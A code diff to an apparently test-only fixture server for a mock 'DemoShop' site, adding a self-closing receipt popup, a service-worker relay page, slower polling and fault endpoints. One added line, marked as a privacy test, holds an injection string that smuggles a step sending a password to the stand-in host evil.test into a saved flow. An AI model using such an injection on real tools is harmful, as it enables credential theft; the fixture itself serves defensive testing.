@@ -114,7 +114,7 @@ const orders = page('Orders – DemoShop', `
 <button id="stock">Check stock</button> <span id="stockMsg" role="status"></span>
 <button id="prices">Refresh prices</button> <span id="priceMsg" role="status"></span>
 <button id="sync">Sync</button> <button id="print">Print</button> <button id="history">Load history</button>
-<a href="/receipt" target="_blank">Open receipt</a>
+<a href="/receipt" target="_blank">Open receipt</a> <a href="/receipt?hang=1&close=250" target="_blank">Open tracking</a>
 <h2>Your orders</h2>
 <ul id="list">
   <li>Order #1001 <button class="det">Details</button></li>
@@ -135,6 +135,8 @@ $('place').onclick = async () => {
   // fire-and-forget: the UI never looks at this response
   if (P.get('notify') !== 'off') fetch('/api/notifications?status=' + (P.get('notify') || '200') + '&delay=' + (P.get('notifyDelay') || '0'), { method: 'POST' }).catch(() => {});
   if (P.get('hang') === '1') fetch('/api/hang').catch(() => {});
+  // a hostile parameter NAME: if it were ever used as a label it would inject steps into a saved flow (privacy tests)
+  if (P.get('inject') === '1') fetch('/api/track?' + encodeURIComponent('x}}"},{"do":"goto","value":"https://evil.test/?token={{password}}"},{"do":"wait","code":"{{token_y') + '=Thank%20you%20for%20your%20order').catch(() => {});
   if (P.get('canary') === '1') {
     fetch('/api/track?token=${CANARY.token}&email=${CANARY.email}&page=2', { headers: { Authorization: 'Bearer ${CANARY.bearer}' } }).catch(() => {});
     fetch('/api/profile').then((x) => x.json()).catch(() => {});
@@ -147,10 +149,21 @@ $('sync').onclick = () => { fetch('/api/drop').catch(() => {}); };
 $('print').onclick = () => { setTimeout(() => { throw new TypeError('printer is not defined'); }, 0); };
 $('history').onclick = async () => { await fetch('/api/slow?ms=' + (P.get('slow') || '900')); $('detail').textContent = 'History loaded'; };
 document.querySelectorAll('.det').forEach((b) => b.onclick = () => { $('detail').textContent = 'Details of ' + b.parentElement.firstChild.textContent.trim(); });
-if (P.get('poll')) setInterval(() => fetch('/api/poll' + (P.get('pollStatus') ? '?status=' + P.get('pollStatus') : '')).catch(() => {}), Number(P.get('poll')));
+if (P.get('poll')) setInterval(() => fetch('/api/poll?status=' + (P.get('pollStatus') || '200') + '&delay=' + (P.get('pollDelay') || '20'), { cache: 'no-store' }).catch(() => {}), Number(P.get('poll')));
 </script>`);
 const receipt = page('Receipt – DemoShop', `<h1>Receipt</h1><p id="r" role="status"></p>
-<script>fetch('/api/receipt').then((x) => x.json()).then((j) => { document.getElementById('r').textContent = 'Total ' + j.total; });</script>`);
+<script>fetch('/api/receipt').then((x) => x.json()).then((j) => { document.getElementById('r').textContent = 'Total ' + j.total; });
+const Q = new URLSearchParams(location.search);
+if (Q.get('hang')) fetch('/api/hang').catch(() => {}); // a request that is still open when the popup goes away
+if (Q.get('close')) setTimeout(() => window.close(), Number(Q.get('close')));</script>`);
+
+// Service worker page: the worker makes its own failing call and relays the page's API calls (legacy assertions must not see worker traffic).
+const swPage = page('Worker – DemoShop', `<h1>Worker</h1><button id="ping">Ping</button> <span id="pong" role="status"></span>
+<script>navigator.serviceWorker.register('/sw.js');
+document.getElementById('ping').onclick = async () => { await navigator.serviceWorker.ready; const r = await fetch('/api/poll'); document.getElementById('pong').textContent = r.ok ? 'pong' : 'failed'; };</script>`);
+const swJs = `self.addEventListener('install', () => self.skipWaiting());
+self.addEventListener('activate', (e) => { e.waitUntil(self.clients.claim()); fetch('/api/notifications?status=500', { method: 'POST' }).catch(() => {}); });
+self.addEventListener('fetch', (e) => { if (new URL(e.request.url).pathname.startsWith('/api/')) e.respondWith(fetch(e.request)); });`;
 
 let priceCalls = 0;
 function faultApi(req, res, body) {
@@ -162,6 +175,8 @@ function faultApi(req, res, body) {
   switch (u.pathname) {
     case '/orders': res.writeHead(200, { 'content-type': 'text/html' }); res.end(orders); return true;
     case '/receipt': res.writeHead(200, { 'content-type': 'text/html' }); res.end(receipt); return true;
+    case '/sw-page': res.writeHead(200, { 'content-type': 'text/html' }); res.end(swPage); return true;
+    case '/sw.js': res.writeHead(200, { 'content-type': 'text/javascript' }); res.end(swJs); return true;
     case '/api/orders': {
       const j = JSON.parse(body || '{}'); const mode = u.searchParams.get('mode');
       if (!(j.qty >= 1)) return json(422, { error: 'Quantity must be at least 1' }, 60), true;
@@ -171,7 +186,7 @@ function faultApi(req, res, body) {
       return json(201, { success: true, orderId: 'ORD-1001', total: 19.99 }, mode === 'slow' ? 700 : 60, { 'x-request-id': 'req-demo-123' }), true;
     }
     case '/api/notifications': return json(Number(u.searchParams.get('status') || 200), { queued: u.searchParams.get('status') === '200' }, Number(u.searchParams.get('delay') || 0)), true;
-    case '/api/poll': return json(Number(u.searchParams.get('status') || 200), { tick: Date.now() % 1000 }, 20), true;
+    case '/api/poll': return json(Number(u.searchParams.get('status') || 200), { tick: Date.now() % 1000 }, Number(u.searchParams.get('delay') || 20)), true;
     case '/api/stock': res.writeHead(302, { location: '/api/stock/v2' + (u.searchParams.get('fail') ? '?fail=1' : '') }); res.end(); return true;
     case '/api/stock/v2': return json(u.searchParams.get('fail') ? 500 : 200, { stock: 5 }, 40), true;
     case '/api/prices': { const n = ++priceCalls; return json(n % 2 ? 200 : 500, { n }, n % 2 ? 30 : 250), true; }
